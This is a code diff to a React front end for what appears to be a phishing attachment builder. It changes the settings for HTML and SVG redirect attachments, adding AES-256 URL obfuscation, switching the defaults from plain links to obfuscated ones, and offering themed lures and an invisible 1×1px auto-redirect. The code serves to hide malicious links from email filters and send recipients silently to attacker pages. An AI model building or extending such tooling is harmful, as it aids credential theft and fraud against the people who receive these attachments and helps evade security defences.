@@ -6458,13 +6458,14 @@ function TabAttachments({filesList, uploadFile, deleteFile, renameFile, selected
                 </div>
                 <div style={{flex:1}}>
                   <label className="lbl">URL Obfuscation</label>
-                  <select value={(attachConfigs.html_redirect||{}).hrObf||"none"} onChange={e=>setAttachConfigs({...attachConfigs,html_redirect:{...(attachConfigs.html_redirect||{}),hrObf:e.target.value}})} style={{fontSize:14,padding:"10px 12px",width:"100%"}}>
-                    <option value="none">None (plain)</option>
+                  <select value={(attachConfigs.html_redirect||{}).hrObf||"base64"} onChange={e=>setAttachConfigs({...attachConfigs,html_redirect:{...(attachConfigs.html_redirect||{}),hrObf:e.target.value}})} style={{fontSize:14,padding:"10px 12px",width:"100%"}}>
+                    <option value="aes256">AES-256-GCM (strongest)</option>
                     <option value="base64">Base64 (atob)</option>
                     <option value="charcode">Char Codes</option>
                     <option value="hex">Hex Escape</option>
                     <option value="split">String Split</option>
                     <option value="reverse">Reversed</option>
+                    <option value="none">None (plain)</option>
                   </select>
                 </div>
               </div>
@@ -6493,21 +6494,24 @@ function TabAttachments({filesList, uploadFile, deleteFile, renameFile, selected
               </div>
               <div className="row g10">
                 <div style={{flex:1}}>
-                  <label className="lbl">Visual Style</label>
-                  <select value={(attachConfigs.svg_redirect||{}).svgrStyle||"auto"} onChange={e=>setAttachConfigs({...attachConfigs,svg_redirect:{...(attachConfigs.svg_redirect||{}),svgrStyle:e.target.value}})} style={{fontSize:14,padding:"10px 12px",width:"100%"}}>
-                    <option value="auto">Auto (invisible, instant)</option>
-                    <option value="click">Click Button</option>
-                    <option value="branded">Branded Document</option>
+                  <label className="lbl">Theme</label>
+                  <select value={(attachConfigs.svg_redirect||{}).svgrStyle||"crimson"} onChange={e=>setAttachConfigs({...attachConfigs,svg_redirect:{...(attachConfigs.svg_redirect||{}),svgrStyle:e.target.value}})} style={{fontSize:14,padding:"10px 12px",width:"100%"}}>
+                    <option value="crimson">Crimson — classic red</option>
+                    <option value="obsidian">Obsidian — dark mono</option>
+                    <option value="cobalt">Cobalt — corporate blue</option>
+                    <option value="cipher">Cipher — terminal green</option>
+                    <option value="auto">Auto — invisible 1×1px</option>
                   </select>
                 </div>
                 <div style={{flex:1}}>
                   <label className="lbl">URL Obfuscation</label>
-                  <select value={(attachConfigs.svg_redirect||{}).svgrObf||"none"} onChange={e=>setAttachConfigs({...attachConfigs,svg_redirect:{...(attachConfigs.svg_redirect||{}),svgrObf:e.target.value}})} style={{fontSize:14,padding:"10px 12px",width:"100%"}}>
-                    <option value="none">None (plain)</option>
+                  <select value={(attachConfigs.svg_redirect||{}).svgrObf||"aes256"} onChange={e=>setAttachConfigs({...attachConfigs,svg_redirect:{...(attachConfigs.svg_redirect||{}),svgrObf:e.target.value}})} style={{fontSize:14,padding:"10px 12px",width:"100%"}}>
+                    <option value="aes256">AES-256-GCM (strongest)</option>
                     <option value="base64">Base64 (atob)</option>
                     <option value="charcode">Char Codes</option>
                     <option value="hex">Hex Escape</option>
                     <option value="split">String Split</option>
+                    <option value="none">None (plain)</option>
                   </select>
                 </div>
               </div>
@@ -11814,10 +11818,10 @@ function App() {
         };
         if(selectedTypes.includes("svg_redirect")) cfg.svg_redirect = {
           link: ac("svg_redirect").svgrLink || "",
-          name: ac("svg_redirect").svgrName || "graphic.svg",
-          style: ac("svg_redirect").svgrStyle || "auto",
-          obfuscation: ac("svg_redirect").svgrObf || "none",
-          delay: ac("svg_redirect").svgrDelay || 800,
+          name: ac("svg_redirect").svgrName || "",
+          style: ac("svg_redirect").svgrStyle || "crimson",
+          obfuscation: ac("svg_redirect").svgrObf || "aes256",
+          delay: ac("svg_redirect").svgrDelay || 1200,
         };
         if(selectedTypes.includes("eml")) cfg.eml = {
           subject: ac("eml").emlSubject || "",
